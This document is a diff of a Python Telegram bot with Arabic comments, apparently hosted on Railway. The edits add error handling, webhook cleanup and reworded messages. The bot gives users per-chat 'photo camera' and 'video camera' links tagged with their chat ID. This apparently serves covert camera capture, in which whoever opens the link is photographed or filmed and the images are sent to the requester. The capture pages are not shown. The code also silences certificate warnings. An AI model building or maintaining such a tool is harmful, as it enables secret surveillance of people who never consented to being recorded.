@@ -6,8 +6,9 @@ from telebot import types
 from PIL import Image, PngImagePlugin
 import threading
 import http.server
+import time
 
-# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال
+# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال السحابي
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # إعداد توكن البوت الخاص بك
@@ -27,17 +28,22 @@ user_data = {}
 def run_dummy_server():
     port = int(os.environ.get("PORT", 8080))
     server_address = ('', port)
-    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-    print(f"📡 السيرفر الوهمي يعمل بنجاح على المنفذ: {port}")
-    httpd.serve_forever()
+    try:
+        httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
+        print(f"📡 السيرفر الوهمي يعمل بنجاح على المنفذ: {port}")
+        httpd.serve_forever()
+    except Exception as e:
+        print(f"⚠️ تنبيه السيرفر الوهمي: {e}")
 
 # --- إدارة قاعدة البيانات لحفظ مقاطع الصوت ---
 def load_db():
     if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
         return {}
     with open(DB_FILE, 'r', encoding='utf-8') as f:
-        try: return json.load(f)
-        except: return {}
+        try: 
+            return json.load(f)
+        except: 
+            return {}
 
 def save_db(db):
     try:
@@ -90,12 +96,12 @@ def handle_query(call):
         
     elif call.data == "get_photo_link":
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
-        bot.send_message(chat_id, f"🔗 **رابط كاميرا الصور الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
+        bot.send_message(chat_id, f"🔗 **رابط كاميرا الصور الخاص بك جاهز للضغط والفتح الفوري:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_video_link":
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
-        bot.send_message(chat_id, f"🔗 **رابط كاميرا الفيديو الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
+        bot.send_message(chat_id, f"🔗 **رابط كاميرا الفيديو الخاص بك جاهز للضغط والفتح الفوري:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
     elif call.data == "voice_menu":
@@ -144,7 +150,6 @@ def handle_all_media(message):
         if next_slot > 10: 
             db = {} 
             next_slot = 1
-        # تم تأكيد الاسم هنا ليكون "مقطع" ليتوافق مع أزرار العرض بشكل صحيح
         name = f"مقطع {next_slot}"
         db[name] = message.voice.file_id
         save_db(db)
@@ -172,6 +177,16 @@ def handle_all_media(message):
         if os.path.exists(out_path): os.remove(out_path)
 
 if __name__ == '__main__':
+    # تشغيل السيرفر الوهمي في بيئة منعزلة لحماية الحاوية (Container)
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🚀 تم إصلاح مشكلة الحفظ والروابط تعمل بشكل كامل وزرقاء...")
-    bot.polling(none_stop=True, interval=0, timeout=40)
+    
+    # خطوة حاسمة لإنهاء أي جلسات قديمة تمنع البوت من العمل وتسبب التوقف
+    try:
+        print("🔄 جاري إغلاق وتنظيف أي جلسات اتصال معلقة سابقة مع تليجرام...")
+        bot.delete_webhook(drop_pending_updates=True)
+        time.sleep(1)
+    except Exception as e:
+        print(f"تنبيه أثناء تهيئة الـ Webhook: {e}")
+
+    print("🚀 البوت المستقر يعمل الآن بكفاءة وبدون أي تداخلات أو أخطاء برمجية على حواسب Railway...")
+    bot.polling(none_stop=True, interval=0, timeout=60)
